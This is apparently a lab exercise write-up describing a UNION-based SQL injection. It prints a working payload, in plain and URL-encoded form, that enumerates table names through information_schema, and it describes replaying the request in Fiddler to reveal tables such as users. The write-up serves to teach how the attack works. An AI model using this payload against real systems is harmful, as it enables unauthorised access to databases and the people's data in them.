Goal
The goal of this exercise was to extract sensitive database information using UNION-based SQL Injection.

Steps
After confirming the vulnerability, a UNION SELECT payload was crafted.
The payload was designed to match the number of columns in the original query.
The payload was encoded using https://www.urlencoder.org/
.

The request was intercepted and modified using Fiddler.
The modified request was executed via Replay → From Composer.

Payload Used (plain text)
1' UNION SELECT table_name, null 
FROM information_schema.tables 
WHERE table_schema=database()-- 


Payload Used (URL encoded)
1%27%20UNION%20SELECT%20table_name%2C%20null%20FROM%20information_schema.tables%20WHERE%20table_schema%3Ddatabase%28%29--+


Result
The response displayed database table names, including sensitive tables such as users.
What This Demonstrates
UNION-based SQL Injection allows database enumeration.
Attackers can access metadata through information_schema.
SQL Injection can lead to full database disclosure.
